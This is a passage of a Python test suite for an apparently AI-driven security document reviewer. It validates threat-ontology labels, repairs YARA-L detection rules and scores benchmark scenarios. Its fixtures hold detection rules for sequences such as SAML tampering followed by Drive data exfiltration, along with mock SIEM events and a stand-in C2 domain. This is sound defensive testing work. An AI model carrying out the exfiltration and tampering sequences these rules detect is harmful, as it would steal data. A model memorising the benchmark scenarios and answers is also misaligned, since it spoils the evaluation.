    for CWE-xxx, CVE-YYYY-NNNNN, Txxxx(.xxx), and D3-xxxx spans across both prose
    paragraphs and Chronicle SIEM YARA-L 2.0 meta: blocks."""
    from manager.tools.docs_review_tools import find_waved_ontology_spans

    sample_text = (
        "Incident Advisory: Exploitation of CVE-2024-3400 rooted in CWE-78 (OS Command Injection) "
        "enables T1190 (Exploit Public-Facing Application) and T1059.004.\n"
        "Recommended Countermeasures: Apply D3-ITF (Inbound Traffic Filtering) and D3-NTF (Network Traffic Filtering).\n\n"
        "rule panos_globalprotect_cmdi {\n"
        "  meta:\n"
        '    cve_id = "CVE-2024-3400"\n'
        '    cwe_id = "CWE-78"\n'
        '    mitre_attack_technique = "T1190"\n'
        '    d3fend_technique = "D3-ITF"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-waved-spans", "WAVED Ontology Spans Test", sample_text
    )
    spans = find_waved_ontology_spans(mock_doc)
    assert len(spans) >= 8

    layers = {s["layer"] for s in spans}
    assert layers == {
        "weakness",
        "vulnerability",
        "exploit",
        "defense",
    }

    ids = [s["identifier"] for s in spans]
    assert "CVE-2024-3400" in ids
    assert "CWE-78" in ids
    assert "T1190" in ids
    assert "T1059.004" in ids
    assert "D3-ITF" in ids
    assert "D3-NTF" in ids

    for s in spans:
        assert s["startIndex"] >= 1
        assert s["endIndex"] > s["startIndex"]
        extracted = sample_text[s["char_start"] : s["char_end"]]
        assert s["identifier"] in extracted

    yaral_meta_spans = [s for s in spans if s["in_yaral2_meta"]]
    assert len(yaral_meta_spans) == 4
    meta_keys = {s["yaral2_meta_key"] for s in yaral_meta_spans}
    assert meta_keys == {
        "cve_id",
        "cwe_id",
        "mitre_attack_technique",
        "d3fend_technique",
    }


def test_analyze_waved_ontology_graph_detects_mismatches_and_chain_breaks() -> None:
    """H21 Suite 2: Verifies detection of CWE_LABEL_MISMATCH, D3FEND_LABEL_MISMATCH,
    CVE_CWE_MISMATCH, ATTACK_D3FEND_MISMATCH, and YARAL2_WAVED_META_DEFECT, while
    confirming zero false positives on a valid 4-layer WAVED chain."""
    from manager.tools.docs_review_tools import analyze_waved_ontology_graph

    # 1. Valid 4-layer WAVED chain (negative control -> 0 defects, completeness == 1.0)
    valid_text = (
        "Valid WAVED Chain: CVE-2024-3400 is rooted in CWE-78 (Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')), "
        "exploited via T1190 (Exploit Public-Facing Application), and countered by D3-ITF (Inbound Traffic Filtering) and D3-NTF (Network Traffic Filtering).\n\n"
        "rule valid_waved_yaral2_rule {\n"
        "  meta:\n"
        '    cve_id = "CVE-2024-3400"\n'
        '    cwe_id = "CWE-78"\n'
        '    mitre_attack_technique = "T1190"\n'
        '    d3fend_technique = "D3-ITF"\n'
        "  events:\n"
        '    $e.metadata.event_type = "PROCESS_LAUNCH"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    valid_report = analyze_waved_ontology_graph(valid_text)
    assert valid_report["status"] == "success"
    assert valid_report["defect_count"] == 0
    assert valid_report["waved_completeness_score"] == 1.0
    assert valid_report["layer_coverage"]["weakness_cwe"] is True
    assert valid_report["layer_coverage"]["vulnerability_cve"] is True
    assert valid_report["layer_coverage"]["exploit_attack"] is True
    assert valid_report["layer_coverage"]["defense_d3fend"] is True
    assert len(valid_report["verified_chains"]) >= 1

    # 2. Defective WAVED text with all 4 defect families
    defective_text = (
        "1. CWE Label Mismatch: CWE-78 (SQL Injection) was cited in the triage summary.\n"
        "2. D3FEND Label Mismatch: Deploy D3-MFA (Network Traffic Filtering) for identity hardening.\n"
        "3. WAVED CVE-CWE Chain Break: CVE-2024-3400 is caused by root weakness CWE-89 (SQL Injection).\n"
        "4. WAVED ATT&CK-D3FEND Chain Break: Mitigate T1078 (Valid Accounts) abuse exclusively via D3-DNSAL (DNS Allowlisting).\n\n"
        "rule defective_waved_yaral2_rule {\n"
        "  meta:\n"
        '    cve_id = "CVE-2024-3400"\n'
        '    cwe_id = "CWE-89"\n'
        '    mitre_attack_technique = "T1078"\n'
        '    d3fend_technique = "D3-DNSAL"\n'
        "  events:\n"
        '    $e.metadata.event_type = "USER_LOGIN"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    defect_report = analyze_waved_ontology_graph(defective_text)
    assert defect_report["status"] == "success"
    assert defect_report["defect_count"] >= 6

    defect_classes = {d["defect_class"] for d in defect_report["defects"]}
    assert "CWE_LABEL_MISMATCH" in defect_classes
    assert "D3FEND_LABEL_MISMATCH" in defect_classes
    assert "WAVED_CHAIN_INCONSISTENCY" in defect_classes
    assert "YARAL2_WAVED_META_DEFECT" in defect_classes

    subtypes = {d["defect_subtype"] for d in defect_report["defects"]}
    assert "CWE_LABEL_MISMATCH" in subtypes
    assert "D3FEND_LABEL_MISMATCH" in subtypes
    assert "CVE_CWE_MISMATCH" in subtypes
    assert "ATTACK_D3FEND_MISMATCH" in subtypes
    assert "YARAL2_META_CWE_MISMATCH" in subtypes
    assert "YARAL2_META_D3FEND_MISMATCH" in subtypes


def test_verify_and_redline_waved_ontology_in_doc_reverse_index_order_and_domain_allowlist(
    monkeypatch,
) -> None:
    """H21 Suite 3: Mocks get_docs_service() and verifies that batchUpdate requests
    are emitted in strict descending startIndex order, all inserted links pass
    validate_url_against_domain_allowlist (cwe.mitre.org, d3fend.mitre.org), and
    redline strike-through + green correction styles are properly structured."""
    from unittest.mock import MagicMock
    from google.adk.tools.function_tool import FunctionTool
    import manager.tools.docs_review_tools as drt
    from manager.tools import tools as tools_module

    doc_text = (
        "WAVED Triage Section:\n"
        "- Valid Chain: CVE-2023-4966 is rooted in CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer) "
        "and mitigated by D3-MFA (Multi-factor Authentication).\n"
        "- Mislabeled CWE: CWE-78 (SQL Injection) on perimeter gateway.\n"
        "- Mislabeled D3FEND: D3-MFA (Network Traffic Filtering) on IdP.\n"
        "- Incompatible Defense: Mitigate T1078 (Valid Accounts) via D3-DNSAL (DNS Allowlisting).\n"
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-waved-mock", "WAVED Redline Unit Test", doc_text
    )

    captured_batches: list[dict[str, Any]] = []
    mock_service = MagicMock()
    mock_docs_resource = MagicMock()
    mock_service.documents.return_value = mock_docs_resource
    mock_docs_resource.get.return_value.execute.return_value = mock_doc

    def _capture_batch_update(documentId: str, body: dict[str, Any]):
        captured_batches.append({"documentId": documentId, "body": body})
        mock_exec = MagicMock()
        mock_exec.execute.return_value = {
            "replies": [{} for _ in body.get("requests", [])]
        }
        return mock_exec

    mock_docs_resource.batchUpdate.side_effect = _capture_batch_update
    monkeypatch.setattr(drt, "get_docs_service", lambda **kwargs: mock_service)

    res = drt.verify_and_redline_waved_ontology_in_doc(
        document_id="doc-waved-mock",
        apply_redlines=True,
        highlight_valid=True,
        append_summary_section=False,
    )
    assert res["status"] == "success"
    assert res["defect_count"] >= 3
    assert res["verified_span_count"] >= 2
    assert res["applied_requests_count"] > 0
    assert len(captured_batches) == 1

    requests = captured_batches[0]["body"]["requests"]
    assert len(requests) == res["applied_requests_count"]

    # Verify strict non-increasing (reverse) anchor order across all defect & valid span groups
    # Note: within a single defect at [s_idx, e_idx), insertText is at e_idx,
    # followed by updateTextStyle on [e_idx, e_idx + len) and updateTextStyle (strikethrough) on [s_idx, e_idx).
    # Therefore the primary anchor index of each request must be non-increasing!
    anchor_indices: list[int] = []
    has_strikethrough = False
    has_green_correction = False
    linked_urls: list[str] = []

    for req in requests:
        if "insertText" in req:
            idx = req["insertText"]["location"]["index"]
            anchor_indices.append(idx)
        elif "updateTextStyle" in req:
            uts = req["updateTextStyle"]
            rng = uts["range"]
            style = uts["textStyle"]
            if style.get("bold") and not style.get("strikethrough"):
                # Inserted correction styling starts at e_idx
                anchor_indices.append(rng["startIndex"])
                has_green_correction = True
            else:
                # Strikethrough on [s_idx, e_idx) or valid highlight on [v_start, v_end)
                anchor_indices.append(rng["startIndex"])
                if style.get("strikethrough"):
                    has_strikethrough = True
            if "link" in style and "url" in style["link"]:
                url = style["link"]["url"]
                linked_urls.append(url)
                assert drt.validate_url_against_domain_allowlist(url) is True

    assert anchor_indices == sorted(anchor_indices, reverse=True), (
        f"Batch requests were not sorted in strict reverse index order: {anchor_indices}"
    )
    assert has_strikethrough is True
    assert has_green_correction is True
    assert any("cwe.mitre.org" in u for u in linked_urls)
    assert any("d3fend.mitre.org" in u for u in linked_urls)

    # Also verify unified orchestrator includes waved_ontology_verification
    unified = drt.run_unified_doc_grounding_review("doc-waved-mock")
    assert unified["status"] == "success"
    assert "waved_ontology_verification" in unified
    assert unified["waved_ontology_verification"]["defect_count"] == res["defect_count"]

    # Verify ADK FunctionTool schema declaration
    ft = FunctionTool(tools_module.verify_and_redline_waved_ontology_in_doc)
    decl = ft._get_declaration()
    assert decl.name == "verify_and_redline_waved_ontology_in_doc"


def test_evaluate_infosec_doc_reviewer_with_waved_benchmark_scenario() -> None:
    """H21 Suite 4: Verifies that evaluate_infosec_doc_reviewer achieves 100%
    precision and recall (F1 = 1.0) on BENCH-07-WAVED-ONTOLOGY-CWE-CVE-ATTACK-D3FEND
    while preserving full backwards compatibility with scenario_ids='all' (6 scenarios)."""
    from manager.tools.docs_review_tools import evaluate_infosec_doc_reviewer

    res_b7 = evaluate_infosec_doc_reviewer(
        scenario_ids="BENCH-07-WAVED-ONTOLOGY-CWE-CVE-ATTACK-D3FEND",
        include_hda_ablation=False,
    )
    assert res_b7["status"] == "success"
    assert res_b7["scenario_count"] == 1
    assert res_b7["total_expected_defects"] == 6
    assert res_b7["true_positive_edits"] == 6
    assert res_b7["false_positive_edits"] == 0
    assert res_b7["false_negative_defects"] == 0
    assert res_b7["span_precision"] == 1.0
    assert res_b7["defect_recall"] == 1.0
    assert res_b7["f1_score"] == 1.0
    assert res_b7["pass2_idempotency_rate"] == 1.0

    res_all_night2 = evaluate_infosec_doc_reviewer(
        scenario_ids="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all_night2["status"] == "success"
    assert res_all_night2["scenario_count"] >= 7
    assert res_all_night2["total_expected_defects"] >= 38
    assert res_all_night2["f1_score"] == 1.0


def test_extract_yaral2_multi_event_spec_parses_sliding_windows_and_timestamp_comparisons() -> None:
    """H22 Suite 1: Verifies UTF-16 span extraction for canonical ($ip over 15m after $iam)
    and malformed sliding windows (within 15 minutes following $ip, over 15m before $iam)
    plus events: timestamp comparisons ($iam.metadata.event_timestamp.seconds < $sql.metadata.event_timestamp.seconds,
    $iam.timestamp > $sql.metadata.event_timestamp)."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        extract_yaral2_multi_event_spec,
        infer_yaral2_event_var_kill_chain_stage,
    )

    canonical_rule = (
        "rule valid_gcp_iam_to_cloudsql {\n"
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.security_result.rule_name = "SetIamPolicy"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $sql.security_result.rule_name = /.*cloudsql\\.instances\\.delete.*/\n'
        "    $sql.principal.ip = $ip\n"
        "    $iam.metadata.event_timestamp.seconds < $sql.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $ip over 15m after $iam\n"
        "  condition:\n"
        "    $iam and $sql\n"
        "}\n"
    )
    iam_stage = infer_yaral2_event_var_kill_chain_stage(canonical_rule, "$iam")
    sql_stage = infer_yaral2_event_var_kill_chain_stage(canonical_rule, "$sql")
    assert iam_stage["stage_rank"] < sql_stage["stage_rank"]

    canon_map = _build_utf16_index_map(canonical_rule)
    canon_spec = extract_yaral2_multi_event_spec(
        canonical_rule,
        rule_char_start=0,
        full_plain_text=canonical_rule,
        index_map=canon_map,
    )
    assert canon_spec["is_multi_event"] is True
    assert len(canon_spec["match_clauses"]) == 1
    mc0 = canon_spec["match_clauses"][0]
    assert mc0["has_sliding_window"] is True
    assert mc0["sliding_window_raw"] == "over 15m after $iam"
    assert mc0["sliding_window_normalized"] == "over 15m after $iam"
    assert mc0["sliding_window_syntax_valid"] is True
    assert mc0["sliding_window_valid"] is True
    assert mc0["sliding_direction_normalized"] == "after"
    assert mc0["sliding_direction_contradicted"] is False
    assert mc0["pivot_event_var"] == "$iam"
    assert mc0["pivot_is_declared_event_var"] is True
    assert mc0["window_seconds"] == 900

    assert len(canon_spec["timestamp_comparisons"]) == 1
    tc0 = canon_spec["timestamp_comparisons"][0]
    assert (
        tc0["comparison_text"]
        == "$iam.metadata.event_timestamp.seconds < $sql.metadata.event_timestamp.seconds"
    )
    assert tc0["lhs_field_valid"] is True
    assert tc0["rhs_field_valid"] is True
    assert tc0["order_reversed"] is False
    assert tc0["comparison_valid"] is True

    malformed_rule = (
        "rule malformed_sliding_and_ts {\n"
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.security_result.rule_name = "SetIamPolicy"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $sql.security_result.rule_name = /.*cloudsql\\.instances\\.delete.*/\n'
        "    $sql.principal.ip = $ip\n"
        "    $iam.timestamp > $sql.metadata.event_timestamp\n"
        "  match:\n"
        "    $ip within 15 minutes following $ip\n"
        "  condition:\n"
        "    $iam and $sql\n"
        "}\n"
    )
    mal_map = _build_utf16_index_map(malformed_rule)
    mal_spec = extract_yaral2_multi_event_spec(
        malformed_rule,
        rule_char_start=0,
        full_plain_text=malformed_rule,
        index_map=mal_map,
    )
    mc_mal = mal_spec["match_clauses"][0]
    assert mc_mal["has_sliding_window"] is True
    assert mc_mal["sliding_window_raw"] == "within 15 minutes following $ip"
    assert mc_mal["sliding_window_syntax_valid"] is False
    assert mc_mal["pivot_event_var"] == "$ip"
    assert mc_mal["pivot_is_declared_event_var"] is False
    assert mc_mal["pivot_is_join_placeholder"] is True
    assert mc_mal["recommended_pivot_event_var"] == "$iam"
    assert mc_mal["sliding_window_normalized"] == "over 15m after $iam"

    tc_mal = mal_spec["timestamp_comparisons"][0]
    assert tc_mal["lhs_field_valid"] is False
    assert tc_mal["rhs_field_valid"] is False
    assert tc_mal["order_reversed"] is True
    assert tc_mal["recommended_operator"] == "<"
    assert (
        tc_mal["recommended_comparison_text"]
        == "$iam.metadata.event_timestamp.seconds < $sql.metadata.event_timestamp.seconds"
    )


def test_find_yaral2_rule_spans_repairs_sliding_window_and_timestamp_ordering_defects() -> None:
    """H22 Suite 2: Verifies deterministic repair across invalid_sliding_window_syntax,
    sliding_window_pivot_event_mismatch, sliding_window_direction_contradiction,
    invalid_event_timestamp_field, and reversed_kill_chain_timestamp_order with
    strictly non-overlapping UTF-16 spans and zero false positives on valid sliding-window rules."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        _spans_overlap,
        find_yaral2_rule_spans,
    )

    doc_text = (
        "rule valid_sliding_window_control {\n"
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.security_result.rule_name = "SetIamPolicy"\n'
        "    $iam.principal.ip = $src_ip\n"
        '    $sql.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $sql.security_result.rule_name = /.*cloudsql\\.instances\\.delete.*/\n'
        "    $sql.principal.ip = $src_ip\n"
        "    $iam.metadata.event_timestamp.seconds <= $sql.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $src_ip over 15m after $iam\n"
        "  condition:\n"
        "    $iam and $sql\n"
        "}\n\n"
        "rule defect_1_syntax_and_ts_field {\n"
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.security_result.rule_name = "SetIamPolicy"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $sql.security_result.rule_name = /.*cloudsql\\.instances\\.delete.*/\n'
        "    $sql.principal.ip = $ip\n"
        "    $iam.timestamp < $sql.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $ip within 15 minutes following $iam\n"
        "  condition:\n"
        "    $iam and $sql\n"
        "}\n\n"
        "rule defect_2_pivot_and_reversed_order {\n"
        "  events:\n"
        '    $tamper.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        '    $tamper.security_result.rule_name = /.*DELETE_SAML2_SERVICE_PROVIDER_CONFIG.*/\n'
        "    $tamper.principal.user.email_addresses = $user\n"
        '    $exfil.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        '    $exfil.security_result.rule_name = /.*CREATE_DATA_TRANSFER_REQUEST.*/\n'
        "    $exfil.principal.user.email_addresses = $user\n"
        "    $tamper.metadata.event_timestamp.seconds > $exfil.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $user over 15m after $user\n"
        "  condition:\n"
        "    $tamper and $exfil\n"
        "}\n\n"
        "rule defect_3_direction_contradiction {\n"
        "  events:\n"
        '    $exec.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $exec.target.process.file.full_path = /.*powershell\\.exe.*/ nocase\n'
        "    $exec.principal.hostname = $host\n"
        '    $svc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $svc.target.process.file.full_path = /.*DERPService\\.exe.*/ nocase\n'
        "    $svc.principal.hostname = $host\n"
        "    $exec.metadata.event_timestamp.seconds < $svc.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $host over 15m before $exec\n"
        "  condition:\n"
        "    $exec and $svc\n"
        "}\n"
    )
    idx_map = _build_utf16_index_map(doc_text)
    comments, edits, findings = find_yaral2_rule_spans(doc_text, idx_map)

    assert len(findings) == 5
    assert len(comments) == 5
    assert len(edits) == 5

    # Zero findings on valid_sliding_window_control
    flagged_rules = {f["rule_name"] for f in findings}
    assert "valid_sliding_window_control" not in flagged_rules

    defect_types = {f["defect_type"] for f in findings}
    assert defect_types == {
        "invalid_sliding_window_syntax",
        "sliding_window_pivot_event_mismatch",
        "sliding_window_direction_contradiction",
        "invalid_event_timestamp_field",
        "reversed_kill_chain_timestamp_order",
    }

    # Verify non-overlapping UTF-16 spans
    spans = [(int(e["start_index"]), int(e["end_index"])) for e in edits]
    for i in range(len(spans)):
        for j in range(i + 1, len(spans)):
            assert not _spans_overlap(spans[i], spans[j]), (
                f"Overlapping spans: {spans[i]} vs {spans[j]}"
            )


def test_evaluate_yaral2_temporal_sequence_and_zero_hit_reversed_timestamp_diagnosis() -> None:
    """H22 Suite 3: Verifies that _run_multi_event_siem_retrohunt and
    diagnose_zero_hit_yaral2_rule parse metadata.event_timestamp from SIEM UDM events,
    compute chronological_pair_count, reversed_pair_count, within_window_pair_count,
    and observed_min_delta_seconds, and automatically diagnose and pivot
    zero_hit_reversed_timestamp_sequence."""
    from manager.tools.docs_review_tools import (
        _run_multi_event_siem_retrohunt,
        diagnose_zero_hit_yaral2_rule,
        verify_yaral2_rule_with_siem,
    )

    # Case 33287: SAML2 config deletion at 14:19:45Z followed 65s later by Drive transfer at 14:20:50Z
    def _mock_siem_search(query: str, max_events: int = 20):
        if "DELETE_SAML2_SERVICE_PROVIDER_CONFIG" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "log_type": "WORKSPACE_ACTIVITY",
                                "event_timestamp": "2026-02-07T14:19:45Z",
                            },
                            "security_result": [
                                {
                                    "rule_name": "Event Name: DELETE_SAML2_SERVICE_PROVIDER_CONFIG"
                                }
                            ],
                            "principal": {
                                "user": {
                                    "email_addresses": ["admin@mydomain.com"]
                                }
                            },
                        }
                    }
                ]
            }
        if "CREATE_DATA_TRANSFER_REQUEST" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "log_type": "WORKSPACE_ACTIVITY",
                                "event_timestamp": "2026-02-07T14:20:50Z",
                            },
                            "security_result": [
                                {
                                    "rule_name": "Event Name: CREATE_DATA_TRANSFER_REQUEST"
                                }
                            ],
                            "principal": {
                                "user": {
                                    "email_addresses": ["admin@mydomain.com"]
                                }
                            },
                        }
                    }
                ]
            }
        return {"events": []}

    def _mock_validate(rule_text: str):
        return {"valid": True, "message": "Rule is valid."}

    # Generic event variable names $a and $b with equal static stage rank (if we use generic predicates)
    # or explicit reversed timestamp inequality $tamper.metadata.event_timestamp.seconds > $exfil.metadata.event_timestamp.seconds
    reversed_rule = (
        "rule workspace_saml2_to_drive_reversed_ts {\n"
        "  events:\n"
        '    $tamper.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        '    $tamper.security_result.rule_name = /.*DELETE_SAML2_SERVICE_PROVIDER_CONFIG.*/\n'
        "    $tamper.principal.user.email_addresses = $user\n"
        '    $exfil.metadata.log_type = "WORKSPACE_ACTIVITY"\n'
        '    $exfil.security_result.rule_name = /.*CREATE_DATA_TRANSFER_REQUEST.*/\n'
        "    $exfil.principal.user.email_addresses = $user\n"
        "    $tamper.metadata.event_timestamp.seconds > $exfil.metadata.event_timestamp.seconds\n"
        "  match:\n"
        "    $user over 15m after $tamper\n"
        "  condition:\n"
        "    $tamper and $exfil\n"
        "}\n"
    )

    me_raw = _run_multi_event_siem_retrohunt(
        reversed_rule,
        siem_search_fn=_mock_siem_search,
    )
    assert me_raw["temporal_sequence_verified"] is False
    assert me_raw["chronological_pair_count"] == 0
    assert me_raw["reversed_pair_count"] == 1
    assert me_raw["observed_min_delta_seconds"] == 65

    diag = diagnose_zero_hit_yaral2_rule(
        reversed_rule,
        siem_validate_fn=_mock_validate,
        siem_search_fn=_mock_siem_search,
    )
    assert diag["status"] == "success"
    assert diag["diagnosis_class"] == "zero_hit_reversed_timestamp_sequence"
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["chronological_pair_count"] == 1
    assert diag["reversed_pair_count"] == 1
    assert diag["within_window_pair_count"] == 1
    assert diag["observed_min_delta_seconds"] == 65
    assert (
        "$tamper.metadata.event_timestamp.seconds < $exfil.metadata.event_timestamp.seconds"
        in diag["pivoted_rule_text"]
    )

    ver = verify_yaral2_rule_with_siem(
        reversed_rule,
        siem_validate_fn=_mock_validate,
        siem_search_fn=_mock_siem_search,
    )
    assert ver["status"] == "success"
    assert ver["compiler_verified"] is True
    assert ver["temporal_sequence_verified"] is True
    assert ver["chronological_pair_count"] == 1
    assert ver["within_window_pair_count"] == 1
    assert ver["observed_min_delta_seconds"] == 65


def test_verify_and_redline_yaral2_rules_in_doc_sliding_window_and_sequence_e2e() -> None:
    """H22 Suite 4: Verifies end-to-end Google Docs red-lining of YARA-L 2.0 sliding-window
    and timestamp-ordering defects via LocalGoogleDocsSimulator, confirming descending
    startIndex edit order, accepted-text convergence, and Pass 2 idempotency."""
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import (
        LocalGoogleDocsSimulator,
        clear_doc_index_cache,
        inspect_doc_suggestions,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()
    sim = LocalGoogleDocsSimulator()
    transport = sim.as_httpx_transport()
    token_source = StaticTokenSource("sim-token")

    doc_md = (
        "# Sliding Window & Kill-Chain Sequence Verification Test\n\n"
        "```yaral\n"
        "rule gcp_iam_to_cloudsql_case_33278 {\n"
        "  events:\n"
        '    $iam.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $iam.security_result.rule_name = "SetIamPolicy"\n'
        "    $iam.principal.ip = $ip\n"
        '    $sql.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $sql.security_result.rule_name = /.*cloudsql\\.instances\\.delete.*/\n'
        "    $sql.principal.ip = $ip\n"
        "    $iam.timestamp > $sql.metadata.event_timestamp\n"
        "  match:\n"
        "    $ip within 15 minutes following $ip\n"
        "  condition:\n"
        "    $iam and $sql\n"
        "}\n"
        "```\n"
    )
    sim.create_or_reset_doc(
        "doc-h22-e2e",
        "H22 Sliding Window E2E",
        doc_md,
        simulate_drive_markdown_import=False,
    )

    def _mock_siem_search(query: str, max_events: int = 20):
        if "SetIamPolicy" in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "log_type": "GCP_CLOUDAUDIT",
                                "event_timestamp": "2026-02-07T14:43:29Z",
                            },
                            "security_result": [{"rule_name": "SetIamPolicy"}],
                            "principal": {"ip": ["104.198.226.161"]},
                        }
                    }
                ]
            }
        return {
            "events": [
                {
                    "udm": {
                        "metadata": {
                            "log_type": "GCP_CLOUDAUDIT",
                            "event_timestamp": "2026-02-07T14:43:39Z",
                        },
                        "security_result": [
                            {
                                "rule_name": "Method Name: cloudsql.instances.delete"
                            }
                        ],
                        "principal": {"ip": ["104.198.226.161"]},
                    }
                }
            ]
        }

    def _mock_validate(rule_text: str):
        return {"valid": True, "message": "Rule is valid."}

    pass1 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h22-e2e",
        run_live_siem_check=True,
        siem_validate_fn=_mock_validate,
        siem_search_fn=_mock_siem_search,
        token_source=token_source,
        transport=transport,
    )
    assert pass1["status"] == "success"
    assert pass1["yaral2_findings_count"] == 4
    assert pass1["edits"]["applied_count"] == 4
    assert pass1["comments"]["inserted_count"] == 4

    inspected = inspect_doc_suggestions(
        "doc-h22-e2e",
        token_source=token_source,
        transport=transport,
    )
    accepted = inspected["accepted_text"]
    assert (
        "$iam.metadata.event_timestamp.seconds < $sql.metadata.event_timestamp.seconds"
        in accepted
    )
    assert "$ip over 15m after $iam" in accepted

    # Pass 2 must skip all existing suggestions
    pass2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-h22-e2e",
        run_live_siem_check=True,
        siem_validate_fn=_mock_validate,
        siem_search_fn=_mock_siem_search,
        token_source=token_source,
        transport=transport,
    )
    assert pass2["status"] == "success"
    assert pass2["edits"]["applied_count"] == 0
    assert pass2["skipped_existing_suggestion_count"] == 4


def test_evaluate_infosec_doc_reviewer_with_bench08_sliding_window_and_sequence() -> None:
    """H22 Suite 5: Verifies that evaluate_infosec_doc_reviewer(scenario_ids='all_with_night2')
    executes BENCH-08-YARAL2-SLIDING-WINDOW-AND-KILLCHAIN-SEQUENCE with span_precision == 1.0,
    defect_recall == 1.0, f1_score == 1.0, false_positive_rate == 0.0, and
    pass2_idempotency_rate == 1.0."""
    from manager.tools.docs_review_tools import evaluate_infosec_doc_reviewer

    res_b8 = evaluate_infosec_doc_reviewer(
        scenario_ids="BENCH-08-YARAL2-SLIDING-WINDOW-AND-KILLCHAIN-SEQUENCE",
        include_hda_ablation=False,
    )
    assert res_b8["status"] == "success"
    assert res_b8["scenario_count"] == 1
    assert res_b8["total_expected_defects"] == 5
    assert res_b8["true_positive_edits"] == 5
    assert res_b8["false_positive_edits"] == 0
    assert res_b8["false_negative_defects"] == 0
    assert res_b8["span_precision"] == 1.0
    assert res_b8["defect_recall"] == 1.0
    assert res_b8["f1_score"] == 1.0
    assert res_b8["false_positive_rate"] == 0.0
    assert res_b8["pass2_idempotency_rate"] == 1.0
    assert (
        res_b8["negative_controls_preserved"]
        == res_b8["total_negative_controls"]
    )

    res_all_night2 = evaluate_infosec_doc_reviewer(
        scenario_ids="all_with_night2",
        include_hda_ablation=True,
    )
    assert res_all_night2["status"] == "success"
    assert res_all_night2["scenario_count"] >= 8
    assert res_all_night2["total_expected_defects"] >= 43
    assert (
        res_all_night2["true_positive_edits"]
        == res_all_night2["total_expected_defects"]
    )
    assert res_all_night2["false_positive_edits"] == 0
    assert res_all_night2["false_negative_defects"] == 0
    assert res_all_night2["span_precision"] == 1.0
    assert res_all_night2["defect_recall"] == 1.0
    assert res_all_night2["f1_score"] == 1.0
    assert res_all_night2["pass2_idempotency_rate"] == 1.0


class TestCycle22GtiIocReputationAndAttribution:
  """Cycle 22 (H23): GTI / VirusTotal Live IoC Reputation & Threat Attribution Red-Liner tests."""

  def test_extract_and_verify_reserved_or_benign_ip_flagged_malicious(self):
    from manager.tools.docs_review_tools import (
        extract_ioc_reputation_and_attribution_claims_from_doc_text,
        verify_ioc_reputation_and_attribution_claims,
    )

    doc_text = (
        "Executive Summary:\n"
        "1. Immediate containment: block external malicious C2 infrastructure "
        "198.51.100.10, 203.0.113.5, and 8.8.8.8 at the corporate perimeter firewall.\n"
        "2. Also isolate external C2 beacon 10.24.0.15 and 1.1.1.1 immediately.\n"
        "3. Legitimate note: 8.8.8.8 is a benign Google Public DNS resolver and "
        "198.51.100.10 is an RFC-5737 TEST-NET-2 documentation IP that must not be blocked.\n"
    )
    extracted = extract_ioc_reputation_and_attribution_claims_from_doc_text(
        doc_text
    )
    assert isinstance(extracted, list)
    extracted_ips = {
        c["ioc_value"] for c in extracted if c.get("ioc_type") == "ipv4"
    }
    assert "198.51.100.10" in extracted_ips
    assert "203.0.113.5" in extracted_ips
    assert "8.8.8.8" in extracted_ips
    assert "1.1.1.1" in extracted_ips

    report = verify_ioc_reputation_and_attribution_claims(doc_text)
    assert report["status"] == "success"
    reserved_defects = [
        d
        for d in report["defects"]
        if d["defect_type"] == "reserved_or_benign_ip_flagged_malicious"
    ]
    assert len(reserved_defects) >= 2
    assert any("198.51.100.10" in d["target_text"] for d in reserved_defects)
    assert any(
        "[IOC REPUTATION & ATTRIBUTION RED-LINE:" in d["expected_replacement"]
        for d in reserved_defects
    )
    # Ensure the negative control line is not flagged
    for d in reserved_defects:
      assert "must not be blocked" not in d["target_text"]

  def test_verify_contradicted_ioc_reputation_verdict(self):
    from manager.tools.docs_review_tools import (
        verify_ioc_reputation_and_attribution_claims,
    )

    doc_text = (
        "IoC Triage Findings:\n"
        "- Source IP 104.198.226.161 in Case 33278 and source IP 79.154.246.114 "
        "(along with domain c2.badactor-example.com) in Cases 33281/33283/33287 "
